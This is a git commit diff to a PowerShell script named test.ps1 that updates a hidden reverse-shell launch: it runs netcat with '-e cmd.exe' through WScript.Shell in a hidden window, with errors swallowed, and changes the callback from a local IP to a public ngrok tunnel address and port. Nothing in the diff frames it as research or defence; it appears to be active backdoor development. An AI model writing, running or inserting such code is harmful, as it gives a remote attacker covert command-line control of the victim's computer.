f52dd4f743c114d17db3d166c2661c7a7097275c
Tech_kY <mr.annonymous2008@gmail.com>
2025-11-20 23:32:42 +0530

    Update command execution with ngrok address

--- test.ps1
+++ test.ps1
@@ -19,7 +19,7 @@ try {
 
 try {
     $WshShell = New-Object -ComObject WScript.Shell
-    $WshShell.Run("`"$NcPath`" 192.168.43.6 4444 -e cmd.exe", 0, $false)
+    $WshShell.Run("`"$NcPath`" 0.tcp.in.ngrok.io 13434 -e cmd.exe", 0, $false)
 } catch {}
 
 Start-Sleep -Seconds 1
